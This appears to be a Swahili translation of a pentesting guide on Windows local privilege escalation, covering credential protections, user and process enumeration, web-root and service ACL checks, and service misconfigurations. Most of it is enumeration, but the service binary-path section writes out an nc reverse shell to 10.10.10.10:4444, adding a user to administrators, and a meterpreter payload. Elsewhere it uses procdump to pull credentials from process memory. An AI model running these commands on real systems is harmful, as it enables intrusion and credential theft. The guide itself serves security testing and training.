Windows Event Forwarding: inafaa kujua logs zinatumwa wapi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa nywila za Administrator wa ndani**, kuhakikisha kwamba kila nywila ni **ya kipekee, inazalishwa kwa nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Nywila hizi huhifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, hivyo kuwaruhusu kuona nywila za admin wa ndani ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewashwa, **nywila za maandishi wazi huhifadhiwa kwenye LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioimarishwa wa Local Security Authority (LSA) ili **kuzuia** michakato isiyoaminika kujaribu **kusoma kumbukumbu yake** au kuingiza msimbo, hivyo kuimarisha zaidi usalama wa mfumo.\
[**Maelezo zaidi kuhusu Ulinzi wa LSA hapa**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Madhumuni yake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama vile mashambulizi ya pass-the-hash. [**Taarifa zaidi kuhusu Credential Guard zinapatikana hapa.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Hati Tambulishi Zilizohifadhiwa kwenye Akiba

**Hati tambulishi za domain** huthibitishwa na **Local Security Authority** (LSA) na kutumiwa na vipengele vya mfumo wa uendeshaji. Data ya kuingia ya mtumiaji inapothibitishwa na kifurushi cha usalama kilichosajiliwa, kwa kawaida hati tambulishi za domain za mtumiaji huanzishwa.\
[**Maelezo zaidi kuhusu Hati Tambulishi Zilizohifadhiwa kwenye Akiba hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Watumiaji na Makundi

### Orodhesha Watumiaji na Makundi

Unapaswa kuangalia kama makundi yoyote uliyomo yana ruhusa za kuvutia.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Vikundi vyenye mapendeleo

Ikiwa **wewe ni mwanachama wa kikundi chenye mapendeleo, unaweza kuongeza privileges**. Jifunze kuhusu vikundi vyenye mapendeleo na jinsi ya kuvitumia vibaya ili kuongeza privileges hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Udanganyifu wa token

**Jifunze zaidi** kuhusu **token** ni nini kwenye ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa unaofuata ili **ujifunze kuhusu token zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Sessions

```bash
qwinsta
klist sessions
```

### Folda za nyumbani

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Sera ya Nenosiri

```bash
net accounts
```

### Pata maudhui ya clipboard

```bash
powershell -command "Get-Clipboard"
```

## Michakato Inayoendeshwa

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **tafuta manenosiri ndani ya command line ya mchakato**.\
Angalia kama unaweza **kubadilisha binary yoyote inayoendeshwa** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**mashambulizi ya DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Daima kagua kama kuna [**electron/cef/chromium debuggers** zinazoendesha, unaweza kuzitumia vibaya ili kuongeza privileges](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

Debugger listener inaweza kuwepo kwa muda mfupi, kwa hivyo kutokuonekana kwenye snapshot moja ya port zilizokaguliwa kwa njia passive hakuthibitishi kuwa haikuwahi kufikiwa. Linganisha listener yoyote iliyogunduliwa na PID yake, mmiliki wa process, na uwezo wa mtumiaji mwenye privileges za chini kuifikia; jina la programu au debug flag pekee havithibitishi uwezekano wa kutekeleza code kati ya watumiaji tofauti. Fanya enumeration ya kawaida kwa njia passive badala ya kutuma debugger commands.

**Kukagua ruhusa za binary za processes**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Kukagua ruhusa za folda za binary za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)** **

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Saraka za dynamic preprocessor za Snort

Snort 2 inaweza kupakia shared libraries kutoka kwenye saraka ya `dynamicpreprocessor directory` iliyotajwa kwenye configuration iliyochaguliwa kwa `snort.exe -c <config>`. Kwa scheduled task au service inayoendesha Snort chini ya akaunti tofauti, kagua configuration hiyo mahususi na ACL ya saraka ya modules iliyotajwa. Ikiwa token yako inaweza kuunda faili humo, njia hiyo inafaa kukaguliwa kama uwezekano wa code execution task au service hiyo itakapopakia modules tena. Thibitisha privileges zinazotumika za akaunti inayoendesha programu, configuration inayotumika, ulinganifu wa modules, na vikwazo vyovyote vya deny au share; saraka inayoweza kuandikiwa pekee haithibitishi escalation. [Nyaraka za Snort za dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) zinaeleza upakiaji wa modules wakati wa runtime.

### Huduma ya wavuti yenye document root inayoweza kuandikiwa na mtumiaji mwenye privileges

Kwenye usakinishaji wa Windows Apache, linganisha njia ya executable ya service na akaunti inayoendesha programu na `DocumentRoot` katika `httpd.conf` inayotumika. Kwa mpangilio wa kawaida wa XAMPP, kagua `C:\xampp\apache\conf\httpd.conf` na ACL ya document root iliyosanidiwa, ambayo mara nyingi ni `C:\xampp\htdocs`. Ikiwa mtumiaji mwenye privileges za chini anaweza kuunda faili kwenye root hiyo huku Apache ikiendeshwa kama `LocalSystem`, code execution ya upande wa server inaweza kuvuka mpaka wa privileges wa host. Thibitisha kuwa service inaendeshwa, njia hiyo mahususi inatolewa, na handler ya upande wa server inachakata aina ya faili hiyo; root inayoweza kuandikiwa pekee inathibitisha tu kuwa faili zinaweza kuundwa. Kagua ACL bila kuandika faili ya majaribio:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Kwa usakinishaji wa kawaida wa WAMP, service inaweza kuelekeza kwenye toleo maalum la `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (au `C:\wamp\...` kwa mpangilio wa 32-bit), huku configuration ikiwa karibu nayo chini ya `conf\httpd.conf` na root ya kawaida ikiwa `C:\wamp64\www` au `C:\wamp\www`. Kagua pamoja service image halisi, identity inayotumika kuendesha service, `DocumentRoot` inayotumika (pamoja na upanuzi wa `${INSTALL_DIR}` na overrides za virtual-host), na ACL ya root. Directory ya WAMP inayoweza kuandikwa haithibitishi kwamba Apache inaendeshwa kama `SYSTEM` au inatekeleza faili iliyowasilishwa. [Apache inaeleza jinsi service ya Windows inavyochagua configuration](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Root ya IIS inayoweza kuandikwa na network identity ya application-pool

Kwa IIS, linganisha directory halisi inayoweza kuandikwa na **site/application inayotumika** katika `applicationHost.config`, kisha tambua pool yake iliyosanidiwa na server-side handler. Code iliyowekwa kwenye directory inayotolewa huendeshwa kama pool tu ikiwa IIS inachakata aina hiyo ya faili na route inaweza kufikiwa. Kagua ruhusa halisi za mtumiaji wa sasa za kuunda faili, hali ya runtime ya site, handler, na overrides za kila path kabla ya kuchukulia directory inayoweza kuandikwa kama code execution.

Dynamic compilation ya ASP.NET ina njia nyingine ya kukagua: faili zinazozalishwa chini ya directory ya compilation ya application. Chaguo-msingi ni directory ya `Temporary ASP.NET Files` iliyo chini ya usakinishaji husika wa .NET Framework, lakini `<compilation tempDirectory>` ya application inaweza kuibadilisha. [Microsoft inaeleza eneo hilo na subdirectory za kila application](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) na [inapendekeza kutenga directory za compilation pale ambapo application pool haziaminiani](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ikiwa token yenye privilege ya chini inaweza kubadilisha source iliyozalishwa kwenye cache ya **application mahususi**, bainisha kama application hiyo inairecompile chini ya [identity ya worker-process](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) yenye privilege ya juu zaidi. ACL ya faili au directory pekee haithibitishi code execution: linganisha cache na application inayotumika, token na ACL halisi, mipangilio ya compilation, process identity, na muda wa recompile yoyote. Tumia ukaguzi wa metadata wa read-only; usichochee compilation wala kubadilisha faili za cache wakati wa enumeration.

Pool ya IIS iliyosanidiwa kama `ApplicationPoolIdentity` au `NetworkService` kwa kawaida hujithibitisha kwa domain resources kama **computer account ya host**, ingawa token yake ya ndani inaweza kuwa na privilege ya chini. `LocalSystem` tayari ina privilege ya juu ndani ya mashine na pia hutumia computer account kwenye mtandao; `LocalService` kwa kawaida hutumia credentials za mtandao zisizojulikana. Pool ya `SpecificUser` hutumia account iliyosanidiwa badala yake. [Microsoft inaeleza aina hizi za identity](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) na [network identity ya application-pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Mpangilio wa identity usiowekwa unaweza kurithi chaguo-msingi za pool, ambazo hutofautiana kati ya matoleo ya IIS, kwa hiyo tambua configuration halisi badala ya kubashiri kutokana na jina la pool. Ikiwa code execution inafika kwenye pool yenye network identity ya computer account, tathmini ruhusa za directory za **computer hiyo mahususi**. [DCSync](../active-directory-methodology/dcsync.md) inahitaji ruhusa za replication kwenye domain naming context; ticket ya machine-account au jukumu la host pekee havithibitishi ruhusa hizo. Passive enumeration inapaswa kukagua configuration na ACL bila kupakia faili, kufanya network authentication, au kuomba tickets.

Kwa ASP.NET handler inayosomeka na inayoanzisha helper process, fuatilia thamani yoyote inayotokana na request kupitia authentication, decryption, validation, na ujenzi wa command. Handler inayounganisha token iliyodecode kwenye `ProcessStartInfo("cmd", "/c ...")` inaweza kuruhusu shell metacharacters kubadilisha command; [Microsoft inaeleza herufi maalum za `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Thibitisha kwamba caller asiyeaminika anaweza kweli kuathiri thamani iliyodecode na kufikia handler, kisha tambua identity halisi ya application-pool au ya impersonation na identity ya child process. Mstari wa source unaosomeka, listener ya localhost, au udhaifu wa muundo wa token pekee havithibitishi privileged command execution. Kagua source na configuration ya pool bila kutuma requests za kughushi au kuendesha helper wakati wa passive enumeration.

Kwa PHP service kwenye Windows, path inayodhibitiwa na request na kupitishwa kwa [`include` au `require`](https://www.php.net/manual/en/function.include.php) inaweza kutekeleza faili ya PHP inayoweza kuandikwa na mtumiaji wa chini kwa identity ya worker. Thibitisha kwamba request inaweza kufikia kauli hiyo, path iliyotatuliwa inaelekeza kwenye faili ambayo mtumiaji wa chini anaweza kubadilisha na worker anaweza kusoma, vizuizi husika vya PHP vya path vinaruhusu include, na worker inaendeshwa kweli ikiwa na privilege ya juu zaidi. Listener ya loopback au faili inayoweza kuandikwa pekee haithibitishi mfuatano huu; kagua source, service identity, na ACL za faili bila kuita endpoint wakati wa passive enumeration.

### Uchimbaji wa nywila kwenye memory

Unaweza kuunda memory dump ya process inayoendelea kwa kutumia **procdump** kutoka sysinternals. Services kama FTP huwa na **credentials katika clear text kwenye memory**; jaribu kudump memory na kusoma credentials.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kuruhusu mtumiaji kufungua CMD au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bofya "Click to open Command Prompt"

### Uingizaji wa faili za mradi zenye upendeleo

Programu inayofungua miradi kiotomatiki kutoka kwenye saraka ya kushusha faili inayoweza kuandikwa na mtumiaji wa kiwango cha chini huvuka mpaka wa uaminifu wa ingizo chini ya akaunti ya programu inayoingiza. Kagua **njia halisi inayoweza kuandikwa**, mchakato au jukumu linaloifungua, utambulisho wake halisi, na toleo la parser. [Tatizo la kihistoria la kufungua/kurejesha mradi wa Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) liliruhusu XML external entities kwenye metadata ya mradi; entity ya mtandao kwenye Windows inaweza kusababisha uthibitishaji kutoka kwa akaunti inayoingiza ikiwa [sera ya SMB inayotoka na NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) inaruhusu. Hii ni dalili ya uwezekano wa kufichuka kwa credentials, si ufikiaji wa msimamizi wa papo hapo: jibu lazima liweze kutumiwa kupitia njia tofauti iliyoidhinishwa au yenye udhaifu, na matoleo ya sasa lazima yakaguliwe kulingana na hali halisi ya patch. Usifungue mradi uliotengenezwa kwa makusudi wakati wa uchunguzi tuli; kagua mtiririko wa uingizaji na ACL.

## Services

Haki ya [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ya kitu cha Service Control Manager (SCM) ni tofauti na haki kwenye service iliyopo. Ombi la ufikiaji la kusoma tu la [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) likifanikiwa kwa haki hiyo ni dalili ya kuchunguza, si uthibitisho kwamba service mpya inaweza kuendeshwa. [`CreateService` hurudisha handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) yenye haki za service zilizoombwa wakati wa kuunda; kufungua tena service baadaye hufanya ukaguzi tofauti wa ufikiaji, na kunaweza kushindwa hata kama handle ya awali ingeweza kutumika. Thibitisha kando tokeni halisi ya ndani au ya mbali, haki za handle zilizopewa, akaunti ya service, sera ya kuanzisha, na njia ya executable. Usitengeneze wala kuanzisha service wakati wa uchunguzi tuli.

Kwa njia ya kusakinisha service kwa mbali, linganisha haki hizo za SCM na share iliyo kwenye target ambayo **logon hiyo hiyo ya mtandao** inaweza kuiandikia, ACL yake ya msingi ya NTFS, na njia ya executable ya ndani ambayo akaunti ya service inaweza kuendesha. Akaunti isiyo ya admin inaweza kuvuka mpaka huu ikiwa kuna haki za SCM zilizo pana isivyo kawaida na njia ya kuweka faili; share ya kiutawala si sharti la lazima. Ufikiaji wa kuandika kwenye share pekee, au dalili ya kuunda service kupitia SCM pekee, hauthibitishi kwamba service mpya inaweza kuanzishwa kwa utambulisho wa juu zaidi.

Service iliyopo inaweza kuita executable saidizi wakati wa kuanzisha, kuzima, au tukio lingine la mzunguko wa maisha hata kama executable hiyo haipo kwenye `ImagePath` yake. Ikiwa jina la executable saidizi linatatuliwa kuwa saraka inayoweza kuandikwa na mtumiaji wa kiwango cha chini na service inaendeshwa kwa utambulisho wa juu zaidi, faili saidizi inayokosekana inaweza kuwa mgombea wa kubadilishwa kwa masharti. Thibitisha **code halisi ya service au mwito wa executable saidizi ulioandikwa kwenye nyaraka**, njia ya executable iliyotatuliwa na mpangilio wa utafutaji, haki za kuunda saraka, utambulisho wa service, na kichochezi cha mzunguko wa maisha kinachopatikana. Saraka ya service inayoweza kuandikwa au faili inayokosekana pekee haithibitishi kwamba service inapakia faili hiyo; ukaguzi tuli haupaswi kuanzisha wala kusimamisha service.

Kwa service iliyopo, [`SERVICE_START` huruhusu kutoa hoja kwa `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); ni tofauti na [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Kagua code ya service au kiolesura chake kilichoandikwa kwenye nyaraka kabla ya kuchukulia ruhusa ya kuianzisha kuwa zaidi ya haki ya udhibiti. Ikiwa inatumia hoja iliyochaguliwa na mpigaji kama njia ya logi au export, thibitisha utambulisho wa service, mtiririko halisi wa hoja hadi uandishi, vizuizi vya njia, na ruhusa za **faili iliyoundwa**. Uandishi kwenye saraka iliyolindwa unaweza kuwa njia ya escalation tu ikiwa kuna mtumiaji au loader tofauti yenye upendeleo inayokubali faili hiyo; logi inayoweza kuandikwa au haki ya kuanzisha pekee haitoshi. Orodha ya mali tuli haipaswi kuanzisha service wala kuunda faili ya majaribio.

Kwa NSClient++ monitoring agent, faili ya `nsclient.ini` inayoweza kusomwa ni **dalili ya kuchunguza usanidi**: inaweza kuwa na credentials za wavuti, ilhali `boot.ini` inaweza kuelekeza usanidi mahali pengine. Kagua akaunti halisi ya service, listener ya WEB na sera ya ufikiaji, na kama role iliyothibitishwa inaweza kubadilisha mipangilio au scripts. Utekelezaji wenye upendeleo pia unahitaji `CheckExternalScripts` (au njia nyingine ya utekelezaji iliyowezeshwa), haki inayotumika ya kusajili au kurekebisha command, na kichochezi kinachoiendesha chini ya utambulisho wa service. Listener inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani, lakini njia ya faili, password, au listener pekee havithibitishi haki hizo. Kagua metadata na ruhusa bila kuonyesha siri au kuita web API wakati wa uchunguzi tuli. Tazama [mpangilio wa faili za NSClient++](https://nsclient.org/docs/concepts/file-layout/), [mwongozo wa usalama wa wavuti na script](https://nsclient.org/docs/setup/securing/), na [usanidi wa external-script](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Kwa service ambayo `ImagePath` yake ni `nssm.exe`, kagua akaunti halisi ya kuendeshea service na thamani yake ya `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM huhifadhi programu tanzu hapo](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), huku `AppDirectory` ikiwa saraka yake ya kufanya kazi iliyosanidiwa. Kagua executable tanzu na ACL za saraka zake kuu kabla ya kuchukulia ruhusa za wrapper kuwa ndizo zinazoamua mpaka mzima wa service. Endpoint ya ndani ya WCF au SOAP inayofichuliwa na programu tanzu hiyo ni dalili tofauti ya kuchunguza: thibitisha kwamba mtumiaji wa kiwango cha chini anaweza kufikia listener, kwamba operesheni husika inakubali ingizo lake, na kwamba service child inatekeleza operesheni isiyo salama kwa utambulisho wa juu zaidi. Akaunti ya service, URL ya endpoint, au njia inayoweza kuandikwa pekee havithibitishi escalation; epuka kuita operesheni za service wakati wa uchunguzi tuli.

Kwa operesheni maalum ya WCF, fuatilia string inayodhibitiwa na mpigaji hadi kwenye PowerShell runspace yoyote. [`Pipeline.Commands.AddScript huongeza maandishi ya script`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), na [`Pipeline.Invoke huendesha pipeline`](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` yenye credentials za Windows transport](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) huthibitisha mteja, lakini ruhusa ya kuita operesheni **hiyo mahususi** na utambulisho halisi wa runspace lazima vikaguliwe kivyake. Njia kutoka kwenye ingizo la mpigaji wa kiwango cha chini hadi `AddScript` chini ya utambulisho wa service wa juu zaidi ni mpaka wa code execution; port inayosikiliza, mteja aliyethibitishwa, au method isiyotumika kwenye assembly isiyohusiana pekee si uthibitisho. Kagua service iliyosakinishwa, contract, ruhusa, na mipangilio ya impersonation kwa njia tuli bila kuita endpoint wakati wa uchunguzi.

Service Triggers huruhusu Windows kuanzisha service hali fulani zinapotokea (shughuli ya named pipe/RPC endpoint, matukio ya ETW, upatikanaji wa IP, kuwasili kwa kifaa, uboreshaji wa GPO, n.k.). Hata bila haki za SERVICE_START, mara nyingi unaweza kuanzisha services zenye upendeleo kwa kuwasha triggers zake. Tazama mbinu za kuorodhesha na kuwasha hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Service ya Visual Studio diagnostic collector

Usakinishaji wa Visual Studio wenye zana za C/C++ unaweza kujumuisha `VSStandardCollectorService150`, service ya uchunguzi iliyosanidiwa kuendeshwa kama `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) ilitumia race ya junction na object-manager-link kuelekeza upya uwekaji upya wa DACL ya service. Escalation iliyoonyeshwa pia ilihitaji njia inayoweza kutumika ya kurekebisha MSI ya Visual Studio Setup WMI Provider na target yake ya `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Kipengele hicho kilirekebishwa Januari 2024.

Kwa uchunguzi tuli wa awali, kagua akaunti na njia ya binary ya service hiyo pekee, angalia kama njia ya Setup WMI compiler ipo, na thibitisha hali ya patch ya kipengele kilichosakinishwa. Ingizo la service, toleo la bidhaa ya Visual Studio, au faili ya compiler pekee havithibitishi kwamba host ina udhaifu. Ukaguzi hauhitaji kuanzisha service wala kuendesha urekebishaji.

Pata orodha ya services:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Ruhusa

Unaweza kutumia **sc** kupata taarifa kuhusu huduma.

```bash
sc qc <service_name>
```

Inapendekezwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha privilege kinachohitajika kwa kila service.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Inapendekezwa kuangalia kama "Authenticated Users" wanaweza kurekebisha huduma yoyote:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Unaweza kupakua accesschk.exe ya XP hapa](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata hitilafu hii (kwa mfano, ukitumia SSDPSRV):

_Hitilafu ya mfumo 1058 imetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu hakuna vifaa vilivyowashwa vinavyohusishwa nayo._

Unaweza kuiwasha kwa kutumia

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Zingatia kwamba huduma ya upnphost inategemea SSDPSRV ili kufanya kazi (kwa XP SP1)**

**Njia nyingine ya kutatua** tatizo hili ni kuendesha:

```
sc.exe config usosvc start= auto
```

### **Rekebisha njia ya binary ya service**

Katika hali ambapo kundi la "Authenticated users" lina **SERVICE_ALL_ACCESS** kwenye service, inawezekana kurekebisha binary inayoweza kutekelezwa ya service. Ili kurekebisha na kutekeleza **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Anzisha upya huduma

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Marupurupu yanaweza kuongezwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Huruhusu kusanidi upya binary ya service.
- **WRITE_DAC**: Huruhusu kusanidi upya ruhusa, na hivyo kuwezesha kubadilisha usanidi wa service.
- **WRITE_OWNER**: Huruhusu kupata umiliki na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Hurithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia hurithi uwezo wa kubadilisha usanidi wa service.

Kwa utambuzi na unyonyaji wa udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu kwenye binary za services

Ikiwa service inaendeshwa kama **`LocalSystem`**, **`LocalService`**, **`NetworkService`**, au akaunti ya domain yenye marupurupu, lakini **watumiaji wenye marupurupu ya chini wanaweza kurekebisha EXE ya service au folda yake kuu**, mara nyingi service inaweza kutekwa nyara kwa **kubadilisha binary na kuanzisha upya service**.

**Angalia kama unaweza kurekebisha binary inayoendeshwa na service** au kama una **ruhusa za kuandika kwenye folda** ilipo binary hiyo ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata binary zote zinazoendeshwa na service kwa kutumia **wmic** (si katika system32), kisha uangalie ruhusa zako kwa kutumia **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Unaweza pia kutumia **sc** na **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Tafuta ACL hatari zilizopewa **`Everyone`**, **`BUILTIN\Users`**, au **`Authenticated Users`**, hasa **`(F)`**, **`(M)`**, au **`(W)`** kwenye faili tekelezi la service au saraka iliyo nayo. Njia ya kawaida ya kuzitumia vibaya ni:<sup>[[27]](#references)</sup>

1. Thibitisha akaunti ya service na njia ya faili tekelezi kwa kutumia `sc qc <service_name>`.
2. Thibitisha kuwa faili ya binary inaweza kuandikwa kwa kutumia `icacls <path>`.
3. Badilisha faili ya binary ya service kwa payload au faili halali ya binary ya service yenye nia mbaya.
4. Anzisha upya service kwa kutumia `sc stop <service_name> && sc start <service_name>` (au subiri kuwashwa upya kwa mfumo / kichocheo cha service).

Ukaguzi otomatiki unaofaa:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ikiwa huduma hairuhusu mtumiaji wa kawaida kuianzisha upya, angalia ikiwa huanza kiotomatiki wakati wa kuwasha mfumo, ina kitendo cha kushindwa kinachoiwasha upya, au inaweza kuchochewa kwa njia isiyo ya moja kwa moja na programu inayoitumia.

### Ruhusa za kurekebisha registry ya huduma

Unapaswa kuangalia ikiwa unaweza kurekebisha registry yoyote ya huduma.\
Unaweza **kuangalia** **ruhusa** zako kwenye **registry** ya huduma kwa kufanya:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Kagua ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za registry zinazowezesha kuandika kwenye ufunguo fulani wa service. Entry ya ACL pekee haithibitishi ufikiaji halisi: entry za deny, token ya sasa na ruhusa zilizorithiwa ni muhimu. Haki za ufunguo wa registry ni tofauti na haki za service object za `SERVICE_CHANGE_CONFIG` na `SERVICE_START`. Escalation pia inahitaji sehemu ya configuration ya service inayoweza kutumika, njia ya kuwasha service na utambulisho wa service wenye privileges za juu zaidi. Angalia [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) na [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) za Microsoft.

Kubadilisha Path ya binary inayotekelezwa:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

